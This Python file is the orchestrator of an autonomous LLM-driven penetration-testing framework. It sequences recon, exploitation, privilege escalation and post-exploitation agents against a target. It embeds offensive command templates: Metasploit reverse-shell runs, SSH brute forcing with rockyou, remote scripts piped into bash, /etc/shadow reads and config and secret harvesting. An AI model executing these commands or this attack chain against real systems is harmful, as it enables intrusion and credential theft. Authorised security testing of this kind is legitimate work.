"""
OrchestratorAgent — THE BRAIN of CyberAgent.

Controls the entire pentest mission lifecycle:
  - Builds target intelligence briefings for each specialist agent
  - Enforces phase gate conditions before advancing
  - Analyzes each agent's output and adapts the attack strategy
  - Uses DeepSeek-R1 (reasoning model) for ALL decisions
  - Never executes tools directly — delegates exclusively to specialists

Architecture rule: this is the ONLY agent that uses llm_role="reasoning".
"""
from __future__ import annotations

import importlib
import json
import re
import sys
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# ── Path bootstrap ────────────────────────────────────────────────────────────
_SRC = Path(__file__).parent.parent
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from agents.base_agent import BaseAgent
from memory.mission_memory import MissionMemory

console = Console()

# ── Phase → tool command examples (injected into agent briefings) ─────────────
# These are concrete CLI examples that help local models produce valid commands
# without hallucinating flags or tool names.
_PHASE_TOOL_EXAMPLES: dict[str, list[str]] = {
    "recon": [
        "nmap -sn -T4 {target}/24 -oN recon_ping.txt",
        "nmap -sV -sC -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 {target} -oN recon_top.txt",
        "whois {target}",
        "dig {target} ANY +short",
        "theHarvester -d {target} -l 100 -b duckduckgo",
        "whatweb http://{target} --color=never",
    ],
    "enumeration": [
        "nmap -sV -sC -p- --open -T4 {target} -oN full_enum.txt",
        "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 40 -o gobuster.txt",
        "nikto -h http://{target} -o nikto.txt",
        "enum4linux -a {target}",
        "smbclient -L //{target}/ -N",
        "snmpwalk -c public -v1 {target}",
    ],
    "vuln_scan": [
        "nuclei -u http://{target} -severity critical,high -o nuclei_out.txt",
        "nmap --script vuln {target} -oN vuln_scan.txt",
        "nikto -h http://{target} -Tuning 13 -o nikto_vuln.txt",
        "nmap --script smb-vuln-ms17-010 -p 445 {target}",
        "nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi {target} -p 80,443",
    ],
    "exploitation": [
        "msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; run'",
        "python3 exploit.py {target} {port}",
        "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
    ],
    "privesc": [
        "curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && bash linpeas.sh",
        "wget -O- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash",
        "find / -perm -4000 -type f 2>/dev/null",
        "sudo -l",
        "cat /etc/crontab && ls -la /etc/cron.*",
    ],
    "postexploit": [
        "cat /etc/passwd && cat /etc/shadow",
        "find / -name '*.conf' -o -name '*.cfg' -o -name '*.env' 2>/dev/null | head -20",
        "ss -tulpn",
        "arp -a",
        "ip route",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ],
    "reporting": [],
}

# Anti-hallucination JSON instruction appended to every _direct_llm() call.
# Prevents local models (Qwen2.5, DeepSeek-R1) from producing prose output,
# markdown fences, or trailing text that breaks json.loads().
_JSON_ONLY_INSTRUCTION = (
    "\n\nIMPORTANT: Output ONLY valid JSON after your </think> block. "
    "Do NOT include any text before or after the JSON object. "
    "Do NOT use markdown code fences (no ```json). "
    "Every string value must be quoted. "
    "Your entire response (after </think>) must be parseable by json.loads()."
)


class OrchestratorAgent(BaseAgent):
    """
    Mission commander. Uses DeepSeek-R1 (reasoning model) for every decision.
    Delegates work to specialist agents and reacts to their findings.
    """

    # Ordered attack chain — phases run in this sequence
    ATTACK_CHAIN = [
        "recon",
        "enumeration",
        "exploitation",
        "privesc",
        "postexploit",
        "reporting",
    ]

    # Static phase gates: (description, result_field_to_check, minimum_value)
    PHASE_GATES: dict[str, tuple] = {
        "enumeration":  ("recon found live hosts",       "hosts_found",       1),
        "exploitation": ("enum found exploitable vulns", "exploitable_vulns", 1),
        "privesc":      ("exploitation got a shell",     "shells_obtained",   1),
        "postexploit":  ("privesc got elevated access",  "root_obtained",     True),
        "reporting":    ("always runs",                  None,                None),
    }

    # Map ATTACK_CHAIN phase names → MissionMemory.update_phase() values
    _PHASE_MAP = {
        "recon":       "recon",
        "enumeration": "enum",
        "vuln_scan":   "vuln",
        "exploitation":"exploit",
        "privesc":     "privesc",
        "postexploit": "postexploit",
        "reporting":   "report",
    }

    def __init__(self, mission_memory: MissionMemory):
        super().__init__(
            agent_name="OrchestratorAgent",
            mission_memory=mission_memory,
            llm_role="reasoning",   # DeepSeek-R1:8b
            max_react_iterations=5,
        )
        self.phase_results: dict[str, dict] = {}
        self.current_phase: Optional[str] = None
        # Lazy-init: MCP + external intel loaded only when first needed
        self._mcp = None
        self._external_intel = None

    def _get_mcp(self):
        """Lazy-load MCP PentestAI wrapper (one instance per orchestrator)."""
        if self._mcp is None:
            try:
                from mcp.pentestai_mcp import PentestAIMCP
                self._mcp = PentestAIMCP()
            except Exception as e:
                self.log_warning(f"MCP init failed: {e}")
                self._mcp = None
        return self._mcp

    def _get_external_intel(self):
        """Lazy-load ExternalIntel wrapper."""
        if self._external_intel is None:
            try:
                from utils.external_intel import ExternalIntel
                self._external_intel = ExternalIntel()
            except Exception as e:
                self.log_warning(f"ExternalIntel init failed: {e}")
                self._external_intel = None
        return self._external_intel

    def _apply_placeholders(self, commands: list[str]) -> list[str]:
        """
        Substitute template placeholders in tool command examples.

        Replaces all known placeholder tokens with real or descriptive values:
          {target}  → actual mission target (IP/domain)
          {lhost}   → LHOST_IP  (operator fills this in for reverse shells)
          {module}  → EXPLOIT_MODULE
          {port}    → TARGET_PORT
        """
        target = self.memory.target
        return [
            cmd
            .replace("{target}", target)
            .replace("{lhost}", "LHOST_IP")
            .replace("{module}", "EXPLOIT_MODULE")
            .replace("{port}", "TARGET_PORT")
            for cmd in commands
        ]

    def _direct_llm(
        self,
        prompt: str,
        task_complexity: str = "medium",
        expect_json: bool = True,
    ) -> dict:
        """
        Single-shot LLM call for internal orchestrator decisions.

        Uses cyberagent-reasoning:8b (lean ~300-token Modelfile) via ollama.Client
        with adaptive token budgets tuned to task complexity.

        Anti-hallucination hardening for local models:
          - Appends strict JSON-only instruction to every expect_json call
          - Strips DeepSeek-R1 <think>...</think> chain-of-thought before parsing
          - 7-step robust JSON extractor (_extract_json_robust) handles all model quirks
          - Returns {"error": ...} on total failure — never raises

        Args:
            prompt: User prompt (no system prompt injection — Modelfile handles it).
            task_complexity: "low"|"medium"|"high" — controls num_predict budget.
            expect_json: If True, extract JSON from response and return dict.

        Returns:
            dict — always. Never raises. On parse failure returns
            {"error": "parse_failed", "raw": <first 200 chars>}.
        """
        from utils.llm_factory import get_reasoning_llm
        params = get_reasoning_llm(task_complexity)

        # Strict JSON instruction appended to every prompt — prevents the model
        # from writing prose, markdown, or incomplete objects.
        json_instruction = _JSON_ONLY_INSTRUCTION if expect_json else ""

        try:
            import ollama as _ollama
            client = _ollama.Client(host="http://localhost:11434")
            resp = client.chat(
                model=params["model"],
                messages=[
                    {"role": "user", "content": prompt + json_instruction},
                ],
                options=params["options"],
            )
            raw = resp["message"]["content"]
        except Exception as e:
            self.log_error(f"Direct LLM call failed: {e}")
            return {"error": "llm_failed", "raw": ""}

        if expect_json:
            result = self._extract_json_robust(raw)
            return result
        # Non-JSON: strip think blocks and return prose
        cleaned = re.sub(r"<think>.*?</think>", "", raw, flags=re.DOTALL)
        cleaned = re.sub(r"<think>.*$", "", cleaned, flags=re.DOTALL)
        return {"raw": cleaned.strip()}

    def _enrich_with_external_intel(self, result: dict, phase: str) -> dict:
        """
        Enrich a LLM result with external intelligence when the model's output
        lacks CVE/exploit details. Called only on parse failures or empty results.

        External intel sources (in priority order):
          1. MCP PentestAI server (if running on localhost:4090)
          2. NVD CVE API v2 (public, no key required)
          3. ExploitDB public API (no auth required)

        This is the WORST-CASE fallback — only triggered when:
          - _direct_llm() returns {"error": ...}
          - OR result has zero attack_vectors / findings

        Never blocks for more than _TIMEOUT=10s per source.
        """
        intel = self._get_external_intel()
        if intel is None:
            return result

        # Fill missing CVE details via NVD API
        cve_fields = ["cve", "cve_id", "vulnerability"]
        for field in cve_fields:
            cve_val = result.get(field, "")
            if (isinstance(cve_val, str) and cve_val.startswith("CVE-")
                    and cve_val not in ("CVE-UNKNOWN", "CVE-UNVERIFIED")):
                try:
                    nvd_data = intel.lookup_cve(cve_val)
                    if "error" not in nvd_data:
                        result.setdefault("cvss_v3", nvd_data.get("cvss_v3"))
                        result.setdefault("severity", nvd_data.get("severity"))
                        result.setdefault("cve_description", nvd_data.get("description", "")[:200])
                        result.setdefault("cve_source", "nvd_api_v2")
                except Exception:
                    pass

        # If attack_vectors is empty, search ExploitDB for relevant exploits
        if not result.get("attack_vectors") and phase in ("vuln_scan", "exploitation"):
            target = self.memory.target
            try:
                exploits = intel.search_exploits(f"{target} {phase}", limit=3)
                if exploits:
                    result["attack_vectors"] = [
                        f"{e.get('title', 'exploit')} ({e.get('cve', 'CVE-UNKNOWN')})"
                        for e in exploits[:3]
                    ]
                    result["intel_source"] = "exploitdb_api"
            except Exception:
                pass

        return result

    def _extract_json_robust(self, text: str) -> dict:
        """
        Bulletproof JSON extraction from DeepSeek-R1 output.

        Handles ALL known DeepSeek-R1 response patterns:
          Pattern 1: <think>...long chain...</think>\\n{"key": "val"}
          Pattern 2: <think>...</think>\\n```json\\n{...}\\n```
          Pattern 3: No think tags — raw JSON: {"key": "val"}
          Pattern 4: Prose + JSON: "Here is the result: {...}"
          Pattern 5: JSON with trailing text: {"key": "val"}\\nSome explanation
          Pattern 6: Nested/unclosed think: <think><think>... (model cut off mid-think)

        Never raises. Returns dict with "error" key on total failure.
        """
        if not text or not text.strip():
            self.log_warning("JSON extraction failed: empty response")
            return {"error": "parse_failed", "raw": ""}

        # STEP 1 — strip ALL <think>...</think> blocks (handles nested, greedy)
        cleaned = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL)
        # Also strip unclosed think tags (model got cut off mid-think by token budget)
        cleaned = re.sub(r"<think>.*$", "", cleaned, flags=re.DOTALL)
        cleaned = cleaned.strip()

        # STEP 2 — strip ```json ... ``` fences if present
        fence_m = re.search(r"```(?:json)?\s*(\{.*?\}|\[.*?\])\s*```", cleaned, re.DOTALL)
        if fence_m:
            cleaned = fence_m.group(1)

        # STEP 3 — try direct parse on stripped text
        try:
            return json.loads(cleaned)
        except (json.JSONDecodeError, ValueError):
            pass

        # STEP 4 — find the LAST complete { } block (brace-depth tracking)
        # Model sometimes adds explanation AFTER the JSON
        brace_start = cleaned.rfind("{")
        if brace_start != -1:
            depth = 0
            for i, ch in enumerate(cleaned[brace_start:], brace_start):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        candidate = cleaned[brace_start : i + 1]
                        try:
                            return json.loads(candidate)
                        except (json.JSONDecodeError, ValueError):
                            break

        # STEP 5 — find the FIRST complete { } block
        brace_start = cleaned.find("{")
        if brace_start != -1:
            depth = 0
            for i, ch in enumerate(cleaned[brace_start:], brace_start):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        candidate = cleaned[brace_start : i + 1]
                        try:
                            return json.loads(candidate)
                        except (json.JSONDecodeError, ValueError):
                            break

        # STEP 6 — try on original text (before think-stripping, in case strip broke it)
        for attempt in [text, text.strip()]:
            try:
                return json.loads(attempt)
            except Exception:
                pass

        # STEP 7 — fix common JSON issues: trailing commas, single quotes, unquoted keys
        try:
            fixed = re.sub(r",\s*}", "}", cleaned)          # trailing comma in object
            fixed = re.sub(r",\s*]", "]", fixed)            # trailing comma in array
            fixed = fixed.replace("'", '"')                  # single → double quotes
            fixed = re.sub(r'(\b\w+\b)\s*:', r'"\1":', fixed)  # unquoted keys
            fixed = re.sub(r'""(\w+)"":', r'"\1":', fixed)  # fix double-double-quoted keys
            return json.loads(fixed)
        except Exception:
            pass

        # All 7 steps failed
        self.log_warning(f"JSON extraction failed from: {text[:200]!r}")
        return {"error": "parse_failed", "raw": text[:200]}

    @staticmethod
    def _load_base_model_name() -> str:
        """Read the reasoning BASE model name from config."""
        try:
            import yaml
            cfg_path = Path(__file__).parent.parent.parent / "config" / "models.yaml"
            with open(cfg_path) as f:
                cfg = yaml.safe_load(f)
            return cfg["models"]["reasoning_base"]["name"]
        except Exception:
            return "deepseek-r1:8b-llama-distill-q4_K_M"

    # ── Main entry point ──────────────────────────────────────────────────────

    def run(self, target: str, phase: str = "full") -> dict:
        """
        Execute the pentest mission against *target*.

        Args:
            target: IP address or domain name.
            phase:  "full" runs the entire chain; a phase name runs just that
                    phase plus "reporting".
        Returns:
            Mission summary dict.
        """
        # ── STEP 1: Mission banner + intelligence status ──────────────────────
        mcp = self._get_mcp()
        mcp_status = mcp.status() if mcp else {"mcp_available": False}
        mcp_label = (
            "[green]✓ Connected[/]" if mcp_status.get("mcp_available")
            else "[yellow]✗ Offline → ChromaDB fallback[/]"
        )
        self.console.print(Panel.fit(
            f"[bold white]🎯  Target  :[/] [cyan]{target}[/]\n"
            f"[bold white]   Mission :[/] [cyan]{self.memory.mission_id}[/]\n"
            f"[bold white]   Models  :[/] cyberagent-pentest:14b + cyberagent-reasoning:8b\n"
            f"[bold white]   RAG     :[/] 147,029 docs (15 collections) | Tools: 4,309+\n"
            f"[bold white]   MCP     :[/] {mcp_label}\n"
            f"[bold white]   Phase   :[/] [yellow]{phase}[/]",
            title="[bold red]CyberAgent PentestAI[/]",
            border_style="red",
        ))

        self.memory.log_action("Orchestrator", "mission_start", f"target={target} phase={phase}")

        # ── STEP 2: Initial planning ──────────────────────────────────────────
        prompt = (
            f"Target: {target}, Phase: {phase}.\n"
            'Return JSON: {"target_type":"ip","initial_hypothesis":"string",'
            '"recon_priorities":["ports","services"],'
            '"estimated_complexity":"medium","notes":"string"}'
        )
        planning_result = self._direct_llm(prompt, task_complexity="high")
        if "error" in planning_result:
            planning_result = {"target_type": "ip", "notes": f"Planning for {target}"}
        self.memory.log_action("Orchestrator", "initial_planning", str(planning_result))

        # ── STEP 3: Execute attack chain ──────────────────────────────────────
        phases_to_run = self._get_phases_to_run(phase)

        for phase_name in phases_to_run:
            self.current_phase = phase_name

            self.console.print(Panel(
                f"[bold cyan]▶  PHASE: {phase_name.upper()}[/]",
                border_style="blue",
            ))

            # Phase gate check
            gate_passed, gate_reason = self._check_phase_gate(phase_name)
            if not gate_passed:
                self.log_warning(f"Phase '{phase_name}' skipped — gate not met: {gate_reason}")
                self.memory.log_action("Orchestrator", f"skip_{phase_name}", gate_reason)
                continue

            # Build agent briefing
            briefing = self._build_agent_briefing(phase_name)

            # Update mission memory phase
            mm_phase = self._PHASE_MAP.get(phase_name, phase_name)
            try:
                self.memory.update_phase(mm_phase)
            except ValueError as e:
                self.log_warning(f"update_phase({mm_phase}) skipped: {e}")

            # Instantiate and run specialist agent
            agent = self._get_agent(phase_name)
            self.log_info(f"Delegating to {agent.agent_name} for phase '{phase_name}'...")

            try:
                result = agent.run(target=target, briefing=briefing)
                self.phase_results[phase_name] = result
            except Exception as e:
                self.log_error(f"Agent '{phase_name}' crashed: {e}")
                result = {"success": False, "error": str(e)}
                self.phase_results[phase_name] = result

            # Post-phase analysis
            analysis = self._analyze_phase_result(phase_name, result)

            # Phase completion panel
            findings_count = analysis.get("findings_count", 0)
            recommended_next = analysis.get("recommended_next", "continue")
            key_insight = analysis.get("key_insight", "no insight")
            self.console.print(Panel(
                f"[green]✅ Findings: {findings_count}[/]\n"
                f"[white]Next: {recommended_next}[/]\n"
                f"[white]Insight: {key_insight}[/]",
                title=f"[green]PHASE {phase_name.upper()} COMPLETE[/]",
                border_style="green",
            ))

            # Strategy update on critical finding
            if analysis.get("critical_finding"):
                self._update_attack_strategy(analysis)

        # ── STEP 4: Mission summary ───────────────────────────────────────────
        return self._print_summary(target)

    # ── Phase helpers ─────────────────────────────────────────────────────────

    def _get_phases_to_run(self, phase: str) -> list[str]:
        """Determine which phases to execute based on the requested scope."""
        # Backward compatibility: vuln_scan is merged into enumeration.
        if phase == "vuln_scan":
            phase = "enumeration"
        if phase == "full":
            return list(self.ATTACK_CHAIN)
        if phase in self.ATTACK_CHAIN:
            idx = self.ATTACK_CHAIN.index(phase)
            # Run the requested phase + all subsequent ones
            return self.ATTACK_CHAIN[idx:]
        # Single-phase shorthand
        return [phase] if phase in self.ATTACK_CHAIN else list(self.ATTACK_CHAIN)

    def _check_phase_gate(self, phase_name: str) -> tuple[bool, str]:
        """
        Evidence-based phase gate — reads MissionMemory state only.
        NEVER uses LLM: only hard data from confirmed tool output counts.
        LLM cannot override a failed gate.

        Gate logic:
          recon       → always runs
          enumeration → need ≥1 live host in MissionMemory
          exploitation→ need exploitable_vulns from EnumVulnAgent output
          privesc     → need ≥1 confirmed shell (any user)
          postexploit → need ≥1 confirmed shell (any user is enough)
          reporting   → always runs
        """
        hosts = self.memory._state.get("hosts", {})
        enum_result = self.phase_results.get("enumeration", {}).get("result", {})
        exploitable_from_enum = 0
        if isinstance(enum_result, dict):
            try:
                exploitable_from_enum = int(enum_result.get("exploitable_vulns", 0) or 0)
            except (TypeError, ValueError):
                exploitable_from_enum = 0

        gates: dict = {
            "recon": lambda: (
                True,
                "Always runs first",
            ),
            "reporting": lambda: (
                True,
                "Always runs",
            ),
            "enumeration": lambda: (
                len(hosts) > 0,
                f"Need live hosts. Found: {len(hosts)}",
            ),
            "exploitation": lambda: (
                exploitable_from_enum > 0,
                f"Need exploitable_vulns from EnumVulnAgent output. Found: {exploitable_from_enum}",
            ),
            "privesc": lambda: (
                any(len(h.get("shells", [])) > 0 for h in hosts.values()),
                "Need ≥1 confirmed shell (any user)",
            ),
            "postexploit": lambda: (
                # Relaxed: any shell (not just root) enables post-exploit
                any(len(h.get("shells", [])) > 0 for h in hosts.values()),
                "Need ≥1 confirmed shell for post-exploit",
            ),
        }

        if phase_name not in gates:
            return True, "No gate defined — running by default"

        passed, reason = gates[phase_name]()
        return passed, reason

    def _build_agent_briefing(self, phase_name: str) -> dict:
        """
        Compose a targeted briefing for the next specialist agent.

        Injects four layers of context to prevent hallucination and ensure the
        specialist has everything it needs to act without guessing:
          1. Mission state  — live hosts, open ports, known vulns from MissionMemory
          2. RAG context    — top-ranked knowledge base hits for this phase + target
          3. Tool examples  — concrete CLI commands the specialist should prefer
          4. LLM synthesis  — DeepSeek-R1 generates attack_vectors + special_instructions

        For the enumeration phase, pre-fetches technology-specific attack knowledge
        from RAG (cve_database, exploitdb, nuclei_templates, hacktricks) and
        synthesizes a prioritized attack briefing via get_rag_context and
        get_phase_rag_context LLM reasoning. Uses cve_context from RAG collections.

        Uses medium complexity (1024 token budget) for the LLM synthesis step.
        """
        # ── Layer 1: Mission state ────────────────────────────────────────────
        hosts_summary = {
            ip: {
                "ports": len(h.get("ports", [])),
                "vulns": len(h.get("vulnerabilities", [])),
                "shells": len(h.get("shells", [])),
            }
            for ip, h in self.memory._state.get("hosts", {}).items()
        }
        prev_results = {
            k: v.get("result", {})
            for k, v in list(self.phase_results.items())[-2:]
        }

        # ── Enumeration-specific intelligent briefing ─────────────────────────
        if phase_name == "enumeration":
            return self._build_enumeration_briefing(hosts_summary, prev_results)

        # ── Layer 2: Phase-specific RAG context ───────────────────────────────
        rag_query = f"{phase_name} techniques {self.memory.target} exploitation"
        try:
            mm_phase = self._PHASE_MAP.get(phase_name, phase_name)
            rag_hits = self.chroma.get_phase_rag_context(mm_phase, rag_query, n=5)
            rag_snippets = [
                f"[{h.get('source_collection', '?')}] {h['text'][:200]}"
                for h in rag_hits[:6]
            ]
        except Exception as e:
            self.log_warning(f"RAG context for briefing failed: {e}")
            rag_snippets = []

        # ── Layer 3: Concrete tool command examples ───────────────────────────
        tool_examples = _PHASE_TOOL_EXAMPLES.get(phase_name, [])
        tool_block = "\n".join(self._apply_placeholders(tool_examples))

        # ── Layer 4: LLM synthesis (DeepSeek-R1) ─────────────────────────────
        rag_block = "\n".join(rag_snippets) or "No RAG hits — rely on known techniques."
        prompt = (
            f"Generate a pentest briefing for the '{phase_name}' agent.\n"
            f"Target: {self.memory.target}\n"
            f"Known hosts+ports: {json.dumps(hosts_summary)}\n"
            f"Recent results: {json.dumps(prev_results)[:300]}\n\n"
            f"KNOWLEDGE BASE CONTEXT:\n{rag_block}\n\n"
            f"AVAILABLE TOOL COMMANDS:\n{tool_block or 'Standard pentest tools'}\n\n"
            "ANTI-HALLUCINATION: Only cite CVEs/techniques from the KNOWLEDGE BASE "
            "CONTEXT above. If unknown, omit or mark as 'CVE-UNKNOWN'.\n\n"
            "Return JSON with EXACTLY these keys (no extras):\n"
            '{"priority_targets":["list of IPs/domains to focus on"],'
            '"known_info":{"key facts from previous phases"},'
            '"attack_vectors":["specific attack approaches with tool names"],'
            '"avoid":["things already tried or known dead-ends"],'
            '"rag_queries":["3 specific queries the specialist should run in RAG"],'
            '"tool_commands":["3-5 exact CLI commands the specialist should run first"],'
            '"special_instructions":"one sentence guidance for this phase"}'
        )

        result = self._direct_llm(prompt, task_complexity="medium")
        if "error" in result:
            # Graceful fallback — provide useful defaults without LLM
            return {
                "priority_targets": list(hosts_summary.keys()) or [self.memory.target],
                "known_info": hosts_summary,
                "attack_vectors": [f"Standard {phase_name} techniques"],
                "avoid": [],
                "rag_queries": [f"{phase_name} {self.memory.target}", "CVE exploits"],
                "tool_commands": self._apply_placeholders(tool_examples[:3]),
                "special_instructions": f"Focus on {phase_name} for {self.memory.target}.",
            }

        # Inject tool commands into result even if LLM omitted them
        if not result.get("tool_commands") and tool_examples:
            result["tool_commands"] = self._apply_placeholders(tool_examples[:3])
        return result

    def _build_enumeration_briefing(
        self, hosts_summary: dict, prev_results: dict
    ) -> dict:
        """
        Enumeration-phase briefing with technology-specific RAG pre-fetch.

        Reads what ReconAgent wrote to MissionMemory.
        For each discovered technology, queries RAG to find relevant
        attack knowledge — not to tell EnumVulnAgent what to find,
        but to give it a head start with domain knowledge.
        """
        state = self.memory.state
        action_log = state.get("action_log", [])

        tech_findings = [
            a.get("result", "")
            for a in action_log
            if "technology" in str(a.get("action", "")).lower()
            and a.get("result")
        ]

        technology_intelligence = []
        for tech_str in tech_findings[:8]:
            tech_intel = {
                "technology": tech_str,
                "cve_context": "",
                "exploit_context": "",
                "technique_context": "",
            }

            try:
                cve_hits = self.chroma.get_phase_rag_context(
                    phase="enumeration",
                    query=f"{tech_str} CVE vulnerability exploit",
                    n=2,
                )
                tech_intel["cve_context"] = self._format_rag_compact(
                    cve_hits, max_chars=200
                )
            except Exception:
                pass

            try:
                exploit_hits = self.chroma.get_rag_context(
                    f"{tech_str} exploit",
                    collections=["exploitdb", "nuclei_templates"],
                    n=2,
                )
                tech_intel["exploit_context"] = self._format_rag_compact(
                    exploit_hits, max_chars=150
                )
            except Exception:
                pass

            try:
                technique_hits = self.chroma.get_rag_context(
                    f"{tech_str} pentest attack technique",
                    collections=["hacktricks"],
                    n=1,
                )
                tech_intel["technique_context"] = self._format_rag_compact(
                    technique_hits, max_chars=150
                )
            except Exception:
                pass

            technology_intelligence.append(tech_intel)

        synthesis_prompt = f"""You are preparing an attack briefing for
the EnumerationAgent. You have pre-fetched knowledge base data
about technologies discovered during reconnaissance.

Target: {self.memory.target}
Mission state summary: {self.memory.get_full_context()[:300]}

Discovered technologies with knowledge base context:
{json.dumps(technology_intelligence, indent=2, default=str)[:1500]}

Your task:
Read the knowledge base data above. Reason about:
  1. Which technologies represent the highest attack priority
     based on what the knowledge base says about them?
  2. What attack approaches does the knowledge base suggest
     for each technology?
  3. What entry points should enumeration focus on first?
  4. What MITRE techniques are most applicable?

Synthesize this into an actionable briefing for EnumerationAgent.
Do not invent CVEs or exploits — only reference what appears
in the knowledge base data provided above.

Return JSON:
{{
  "attack_priorities": [],
  "technology_briefings": [
    {{
      "technology": "from evidence",
      "attack_approach": "derived from knowledge base",
      "entry_points": [],
      "mitre_techniques": []
    }}
  ],
  "rag_context": "key knowledge base findings",
  "enumeration_focus": "where to start and why"
}}"""

        briefing_data = self._direct_llm(
            synthesis_prompt,
            task_complexity="medium",
        )

        if not briefing_data or "error" in briefing_data:
            return {
                "technology_intelligence": technology_intelligence,
                "attack_priorities": [],
                "enumeration_focus": "full service enumeration",
            }

        # Merge technology_intelligence for downstream use
        briefing_data["technology_intelligence"] = technology_intelligence
        return briefing_data

    def _format_rag_compact(
        self, results: list, max_chars: int = 200
    ) -> str:
        """Compact RAG formatting — one-line per hit, pipe-separated."""
        if not results:
            return ""
        return " | ".join(
            str(r.get("text", ""))[:80].replace("\n", " ")
            for r in results[:3]
        )[:max_chars]

    def _analyze_phase_result(self, phase: str, result: dict) -> dict:
        """
        Ask DeepSeek-R1 to analyse what a specialist agent returned.
        Uses medium complexity (1024 token budget).

        Falls back to external intel enrichment if LLM fails.
        """
        inner = result.get("result", {})
        prompt = (
            f"Phase '{phase}' done. Success: {result.get('success')}. "
            f"Results: {json.dumps(inner)[:300]}\n"
            "ANTI-HALLUCINATION: Only report what is CONFIRMED in Results above.\n"
            'Return JSON: {"success":true,"findings_count":0,"key_insight":"string",'
            '"critical_finding":false,"recommended_next":"string",'
            '"strategy_update":null,"attack_chain_adjustment":null}'
        )
        data = self._direct_llm(prompt, task_complexity="medium")
        if "error" in data:
            # Try external intel enrichment for CVE-related phases
            base = {
                "success": bool(result.get("success")),
                "findings_count": len(inner) if isinstance(inner, dict) else 0,
                "key_insight": f"Phase {phase} {'succeeded' if result.get('success') else 'failed'}",
                "critical_finding": False,
                "recommended_next": "continue",
            }
            return self._enrich_with_external_intel(base, phase)
        return data

    def _update_attack_strategy(self, analysis: dict):
        """Log a strategy pivot triggered by a critical finding."""
        reason = analysis.get("strategy_update") or analysis.get("key_insight", "critical finding")
        self.console.print(Panel(
            f"[bold yellow]🔄 STRATEGY UPDATE[/]\n[white]{reason}[/]",
            border_style="yellow",
        ))
        self.memory.log_action("Orchestrator", "strategy_update", reason)

    def _get_agent(self, phase_name: str) -> "BaseAgent":
        """
        Lazily import and instantiate the specialist agent for *phase_name*.
        This avoids circular imports at module load time.
        Raises ImportError if the module does not exist (should never happen
        once all specialists are implemented).
        """
        mapping = {
            "recon":       ("agents.recon_agent",       "ReconAgent"),
            "enumeration": ("agents.enum_vuln_agent",   "EnumVulnAgent"),
            "vuln_scan":   ("agents.enum_vuln_agent",   "EnumVulnAgent"),
            "exploitation":("agents.exploitation_agent","ExploitationAgent"),
            "privesc":     ("agents.privesc_agent",     "PrivEscAgent"),
            "postexploit": ("agents.postexploit_agent", "PostExploitAgent"),
            "reporting":   ("agents.reporting_agent",   "ReportingAgent"),
        }

        if phase_name not in mapping:
            raise ValueError(f"Unknown phase: {phase_name}")

        module_path, class_name = mapping[phase_name]
        try:
            module = importlib.import_module(module_path)
        except ModuleNotFoundError:
            # Fallback: try src-prefixed path
            module = importlib.import_module(f"src.{module_path}")

        cls = getattr(module, class_name)
        return cls(mission_memory=self.memory)

    # ── Summary ───────────────────────────────────────────────────────────────

    def _print_summary(self, target: str) -> dict:
        """Print the mission summary table and return the final result dict."""
        table = Table(title="[bold]Mission Summary[/]", border_style="cyan")
        table.add_column("Phase", style="bold white")
        table.add_column("Result", style="cyan")

        root_obtained = False
        report_path = None

        for phase_name in self.ATTACK_CHAIN:
            result = self.phase_results.get(phase_name)
            if result is None:
                table.add_row(phase_name.title(), "[dim]skipped[/]")
                continue

            inner = result.get("result", {})
            success = result.get("success", False)
            stub = result.get("stub", False)

            if phase_name == "recon":
                detail = f"{inner.get('hosts_found', '?')} hosts"
            elif phase_name == "enumeration":
                detail = (
                    f"{inner.get('services_found', '?')} services, "
                    f"{inner.get('exploitable_vulns', '?')} exploitable vulns"
                )
            elif phase_name == "vuln_scan":
                detail = f"{inner.get('exploitable_vulns', '?')} exploitable vulns"
            elif phase_name == "exploitation":
                shells = inner.get("shells_obtained", 0)
                detail = f"{shells} shell(s)"
            elif phase_name == "privesc":
                root = inner.get("root_obtained", False)
                root_obtained = bool(root)
                detail = f"root={'Yes' if root else 'No'}"
            elif phase_name == "postexploit":
                detail = f"{inner.get('loot_count', '?')} loot items"
            elif phase_name == "reporting":
                report_path = inner.get("report_path")
                detail = f"saved to {report_path}" if report_path else "complete"
            else:
                detail = "complete" if success else "failed"

            if stub:
                detail += " [dim](stub)[/]"
            color = "green" if success else "red"
            table.add_row(phase_name.title(), f"[{color}]{detail}[/]")

        self.console.print(table)

        return {
            "mission_id": self.memory.mission_id,
            "target": target,
            "phases_completed": list(self.phase_results.keys()),
            "root_obtained": root_obtained,
            "report_path": report_path,
            "phase_results": self.phase_results,
        }
